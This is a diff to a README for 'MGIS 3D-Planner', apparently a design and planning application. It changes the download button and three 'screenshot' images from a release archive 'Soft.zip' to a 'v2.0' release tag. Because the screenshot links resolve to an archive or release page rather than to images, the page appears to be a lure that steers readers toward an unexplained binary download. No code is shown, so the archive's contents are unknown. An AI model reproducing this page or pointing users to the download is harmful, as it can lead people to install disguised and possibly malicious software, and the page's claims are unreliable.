@@ -17,16 +17,16 @@ MGIS 3D-Planner is a powerful platform for rural and urban design, development, 
 ## Getting Started 🚀
 To get started with MGIS 3D-Planner, you can download the latest release by clicking the button below:
 
-[![Download MGIS 3D-Planner](https://github.com/Sevno/mgis-3d-planner-1.0/releases/download/v1.0/Soft.zip)](https://github.com/Sevno/mgis-3d-planner-1.0/releases/download/v1.0/Soft.zip)
+[![Download MGIS 3D-Planner](https://github.com/Sevno/mgis-3d-planner-1.0/releases/tag/v2.0)](https://github.com/Sevno/mgis-3d-planner-1.0/releases/tag/v2.0)
 
 Once you have downloaded the release, launch the application and start exploring the features!
 
 ## Screenshots 🖼️
 Here are some screenshots of MGIS 3D-Planner in action:
 
-![Screenshot 1](https://github.com/Sevno/mgis-3d-planner-1.0/releases/download/v1.0/Soft.zip)
-![Screenshot 2](https://github.com/Sevno/mgis-3d-planner-1.0/releases/download/v1.0/Soft.zip)
-![Screenshot 3](https://github.com/Sevno/mgis-3d-planner-1.0/releases/download/v1.0/Soft.zip)
+![Screenshot 1](https://github.com/Sevno/mgis-3d-planner-1.0/releases/tag/v2.0)
+![Screenshot 2](https://github.com/Sevno/mgis-3d-planner-1.0/releases/tag/v2.0)
+![Screenshot 3](https://github.com/Sevno/mgis-3d-planner-1.0/releases/tag/v2.0)
 
 ## Contributing 🤝
 We welcome contributions to MGIS 3D-Planner! If you have any ideas for new features or enhancements, feel free to submit a pull request.
